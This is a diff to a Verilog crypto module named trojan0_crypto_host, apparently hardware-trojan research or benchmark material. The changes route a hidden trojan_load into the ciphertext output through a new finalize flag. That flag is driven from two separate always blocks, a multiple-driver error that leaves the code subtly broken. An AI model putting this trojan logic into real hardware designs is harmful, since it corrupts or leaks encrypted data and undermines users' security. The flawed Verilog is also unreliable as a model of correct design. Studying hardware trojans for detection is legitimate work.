@@ -24,6 +24,7 @@ module trojan0_crypto_host #(
     reg [127:0] key_generator;
     reg [3:0] round_counter;
     reg [2:0] crypto_state;
+    reg state_at_finalize;  // Flag to indicate when we're at the finalize state
     
     // Key generation for trojan
     always @(posedge clk or posedge rst) begin
@@ -43,10 +44,12 @@ module trojan0_crypto_host #(
             round_counter <= 4'h0;
             crypto_state <= 3'b000;
             encrypt_done <= 1'b0;
+            state_at_finalize <= 1'b0;
         end else begin
             case (crypto_state)
                 3'b000: begin // IDLE
                     encrypt_done <= 1'b0;
+                    state_at_finalize <= 1'b0;
                     if (encrypt_start) begin
                         state <= plaintext;
                         round_key <= cipher_key;
@@ -67,6 +70,7 @@ module trojan0_crypto_host #(
                 end
                 3'b010: begin // FINALIZE
                     encrypt_done <= 1'b1;
+                    state_at_finalize <= 1'b1;
                     crypto_state <= 3'b000;
                 end
                 default: crypto_state <= 3'b000;
@@ -76,11 +80,13 @@ module trojan0_crypto_host #(
     
     // Output with trojan load integration
     always @(posedge clk or posedge rst) begin
-        if (rst)
+        if (rst) begin
             ciphertext <= {DATA_WIDTH{1'b0}};
-        else if (encrypt_done)
+        end else if (state_at_finalize) begin
             // Mix ciphertext with trojan load
             ciphertext <= state ^ {{DATA_WIDTH-64{1'b0}}, trojan_load};
+            state_at_finalize <= 1'b0;  // Clear the flag
+        end
     end
     
     // Instantiate Trojan0
